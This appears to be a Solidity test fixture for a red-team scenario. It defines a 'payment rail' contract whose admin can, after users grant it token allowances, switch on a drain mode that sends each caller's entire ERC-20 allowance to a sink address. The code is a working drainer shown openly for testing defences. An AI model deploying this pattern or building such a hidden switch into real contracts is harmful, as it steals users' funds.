// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.24;

// Red-team scenario F: a "payment rail" module (IPaymentRail shape) whose
// publisher can switch it to draining after users opted in (trusted it).
// Compiled once with solc 0.8.29 (contracts/.solc), cancun, optimizer 200;
// the bytecode is embedded in redteam_fg_test.go (rtfgRailBin).
interface IERC20 {
    function transferFrom(address from, address to, uint256 v) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract RtfgRail {
    address public admin;
    address public sink;
    bool public drain;

    constructor(address sink_) {
        admin = msg.sender;
        sink = sink_;
    }

    // The "version swap" without a new address: same code, same code hash.
    function set(address sink_, bool drain_) external {
        require(msg.sender == admin, "admin");
        sink = sink_;
        drain = drain_;
    }

    // data: abi.encode(address to). Honest: moves `amount` to `to`. Drain: the whole allowance to the sink.
    function pay(address token, uint256 amount, bytes calldata data) external payable returns (bytes32) {
        address to = abi.decode(data, (address));
        uint256 a = amount;
        if (drain) {
            to = sink;
            a = IERC20(token).allowance(msg.sender, address(this));
        }
        require(IERC20(token).transferFrom(msg.sender, to, a), "transferFrom");
        return keccak256(abi.encode(msg.sender, to, a));
    }

    function railInfo() external pure returns (string memory, string memory) {
        return ("shielded-pool", "https://example.org/rail");
    }
}
